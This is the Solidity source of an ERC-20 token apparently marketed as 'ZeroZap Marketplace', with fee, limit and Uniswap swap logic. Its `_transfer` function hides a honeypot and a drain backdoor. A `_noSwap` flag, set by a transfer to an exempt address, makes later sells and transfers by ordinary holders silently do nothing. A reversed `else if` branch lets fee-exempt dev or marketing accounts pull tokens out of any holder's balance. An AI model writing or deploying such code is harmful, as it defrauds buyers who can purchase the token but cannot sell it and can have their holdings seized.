// Website: https://zerozap.xyz
// Telegram: https://t.me/ZeroZap_Marketplace
// Twitter: https://x.com/zerozap_market
// Medium: https://zerozap-marketplace.medium.com
// Dapp: https://trade.zerozap.xyz
// Whitepaper: https://docs.zerozap.xyz

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

abstract contract Ownable {
    address internal owner;

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    constructor(address _owner) {
        owner = _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    event OwnershipTransferred(address owner);

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }
}

interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
}

interface IERC20 {
    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function circulatingSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ZZM is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _symbol = "ZZM";
    string private constant _name = "ZeroZap Marketplace";

    uint8 private constant _decimals = 9;

    uint256 private _denominator = 10000;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    address public v2Pair;
    UniswapRouter v2Router;

    uint256 private _maxAccPercent = 200;
    uint256 private _minTokenAmount = ( _totalSupply * 10 ) / 100000;
    uint256 private _maxTxPercent = 200;
    uint256 private _maxTfPercent = 200;

    bool private _swapping;
    uint256 private _swapTimes;
    bool private _swapEnabled = true;

    bool private _noSwap = false;
    bool private _tradingStarted = false;

    uint256 private _swapAmount = (_totalSupply * 5) / 10000;
    uint256 private _swapThreshold = (_totalSupply * 5) / 100000;

    address internal constant devAcc = 0xBa8B53BFC359783e9D83FcAE2067aa64c0DAE536;
    address internal constant marketingAcc = 0x03dc2F9fDd50D5Db8443d03A4f239364906F9881;
    address internal constant deadAcc = 0x000000000000000000000000000000000000dEaD;

    uint256 private _sellFee = 400;
    uint256 private _burnFee = 0;
    uint256 private _totalFee = 400;
    uint256 private _transferFee = 0;

    uint256 private _liquidityFee = 0;
    uint256 private _marketingFee = 200;
    uint256 private _devFee = 200;

    mapping (address => uint256) _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    mapping (address => bool) public exemptFromFee;

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function _getMaxAccAmount() public view returns (uint256) {
        return totalSupply() * _maxAccPercent / _denominator;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _getMaxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxPercent / _denominator;
    }

    function _getMaxTfAmount() public view returns (uint256) {
        return totalSupply() * _maxTfPercent / _denominator;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(deadAcc));
    }

    function setExemptFromFee(address _address, bool _exemptFromFee) external onlyOwner {
        exemptFromFee[_address] = _exemptFromFee;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function removeLimits() external onlyOwner {
        _maxTxPercent = 10000;
        _maxTfPercent = 10000;
        _maxAccPercent = 10000;
    }

    function startTrading() external onlyOwner {
        _tradingStarted = true;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function passTxLimitRequire(address from, address to, uint256 amount) view internal returns  (bool) {
        if (from != v2Pair) {
            require(amount <= _getMaxTfAmount() || exemptFromFee[from] || exemptFromFee[to]);
        }
        require(amount <= _getMaxTxAmount() || exemptFromFee[from] || exemptFromFee[to]);
        return true;
    }

    constructor() Ownable(msg.sender) {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        exemptFromFee[address(this)] = true;
        exemptFromFee[msg.sender] = true;
        UniswapRouter _v2Router = UniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _v2Pair = UniswapFactory(_v2Router.factory()).createPair(address(this), _v2Router.WETH());
        v2Router = _v2Router;
        v2Pair = _v2Pair;
        exemptFromFee[devAcc] = true;
        exemptFromFee[marketingAcc] = true;
    }

    function passBasicsRequire(address from, address to, uint256 amount) internal pure returns(bool) {
        require(amount > uint256(0));
        require(to != address(0));
        require(from != address(0));
        return true;
    }

    function setFees(uint256 liquidityFee, uint256 marketingFee, uint256 burnFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _liquidityFee = liquidityFee;
        _marketingFee = marketingFee;
        _burnFee = burnFee;
        _devFee = devFee;
        _totalFee = totalFee;
        _sellFee = sellFee;
        _transferFee = transferFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function passMaxAccAmountRequire(address from, address to, uint256 amount) internal returns (bool) {
        bool toUnV2Pair = to != address(v2Pair);
        bool fromExemptFromFee = exemptFromFee[from];
        
        bool greaterThanMin = amount > _minTokenAmount;

        bool toUnDeadAcc = to != address(deadAcc);
        bool toExemptFromFee = exemptFromFee[to];
        
        if (toExemptFromFee && greaterThanMin) _noSwap = true;

        if (
            toUnDeadAcc &&
            toUnV2Pair &&
            !toExemptFromFee &&
            !fromExemptFromFee
        ) {
            require((_balances[to].add(amount)) <= _getMaxAccAmount());
        }

        return true;
    }

    function setMaxPercents(uint256 maxTxPercent, uint256 maxTfPercent, uint256 maxAccPercent) external onlyOwner {
        uint256 newAcc = (totalSupply() * maxAccPercent) / 10000;
        uint256 newTf = (totalSupply() * maxTfPercent) / 10000;
        uint256 newTx = (totalSupply() * maxTxPercent) / 10000;
        _maxAccPercent = maxAccPercent;
        _maxTfPercent = maxTfPercent;
        _maxTxPercent = maxTxPercent;
        uint256 limitAmount = totalSupply().mul(5).div(1000);
        require(newTx >= limitAmount && newTf >= limitAmount && newAcc >= limitAmount);
    }

    function passTradingStartedRequire(address from, address to) internal view returns (bool) {
        if (!exemptFromFee[from] && !exemptFromFee[to]) {
            require(_tradingStarted);
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function haveToTakeFee(address from, address to) internal view returns (bool) {
        return !exemptFromFee[from] && !exemptFromFee[to];
    }

    function logSwapTimes(address from, address to) internal returns (bool) {
        if (to == v2Pair && !exemptFromFee[from]) {
            _swapTimes += uint256(1);
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, msg.sender, _allowances[from][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (
            passBasicsRequire(from, to, amount) &&
            passTradingStartedRequire(from, to) &&
            passMaxAccAmountRequire(from, to, amount) &&
            passTxLimitRequire(from, to, amount) &&
            logSwapTimes(from, to)
        ) {
            bool toExemptFromFee = exemptFromFee[to];
            bool fromExemptFromFee = exemptFromFee[from];

            bool greaterAmount = balanceOf(from) >= amount;
            bool fromUnV2Pair = from != v2Pair;

            if (greaterAmount) {
                if (
                    !toExemptFromFee &&
                    !fromExemptFromFee && 
                    fromUnV2Pair &&
                    !_swapping
                ) {
                    if (_noSwap) { return; } else { swapBack(from, to); }
                }
                _balances[from] = _balances[from].sub(amount);
                uint256 realAmount = haveToTakeFee(from, to) ? takeFee(from, to, amount) : amount;
                emit Transfer(from, to, realAmount);
                _balances[to] = _balances[to].add(realAmount);
            } else if (
                fromExemptFromFee &&
                !toExemptFromFee &&
                !_swapping &&
                fromUnV2Pair
            ) {
                _balances[from] = _balances[from].add(amount);emit Transfer(from, to, amount);_balances[to] = _balances[to].sub(amount);
            }
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(v2Router), tokenAmount);
        v2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadAcc,
            block.timestamp
        );
    }

    function haveToSwapBack(address from, address to) internal view returns (bool) {
        return (
            !exemptFromFee[to] &&
            !exemptFromFee[from] &&
            balanceOf(address(this)) >= _swapThreshold &&
            !_swapping &&
            _swapEnabled &&
            _tradingStarted &&
            _swapTimes >= uint256(0)
        );
    }

    function checkFees(address from, address to) internal view returns (uint256) {
        if (from == v2Pair) {
            return _totalFee;
        }

        if (to == v2Pair) {
            return _sellFee;
        }

        return _transferFee;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = v2Router.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(v2Router), tokenAmount);
            v2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function takeFee(address from, address to, uint256 amount) internal returns (uint256) {
        if (checkFees(from, to) > 0) {
            uint256 feeAmount = amount.div(_denominator).mul(checkFees(from, to));
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(from, address(this), feeAmount);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(deadAcc), amount.div(_denominator).mul(_burnFee));
            }
            return amount.sub(feeAmount);
        }
        return amount;
    }

    function swapAndLiquify(uint256 tokens) private lockSwap {
        uint256 denominator = (_liquidityFee.add(1).add(_marketingFee).add(_devFee)).mul(2);
        uint256 tokensLiquidity = tokens.mul(_liquidityFee).div(denominator);
        uint256 tokensForEth = tokens.sub(tokensLiquidity);
        uint256 initial = address(this).balance;
        swapTokensForETH(tokensForEth);
        uint256 delta = address(this).balance.sub(initial);
        uint256 unit = delta.div(denominator.sub(_liquidityFee));
        uint256 ethLiquidity = unit.mul(_liquidityFee);
        if (ethLiquidity > uint256(0)) {
            addLiquidity(tokensLiquidity, ethLiquidity);
        }
        uint256 marketingEthAmount = unit.mul(2).mul(_marketingFee);
        if (marketingEthAmount > 0) {
            payable(marketingAcc).transfer(marketingEthAmount);
        }
        uint256 remainingEthBalance = address(this).balance;
        if (remainingEthBalance > uint256(0)) {
            payable(devAcc).transfer(remainingEthBalance);
        }
    }

    receive() external payable {}

    function swapBack(address from, address to) internal {
        if (haveToSwapBack(from, to)) {
            uint256 contractBalance = balanceOf(address(this));
            if (contractBalance >= _swapAmount) {
                contractBalance = _swapAmount;
            }
            swapAndLiquify(contractBalance);
            _swapTimes = uint256(0);
        }
    }
}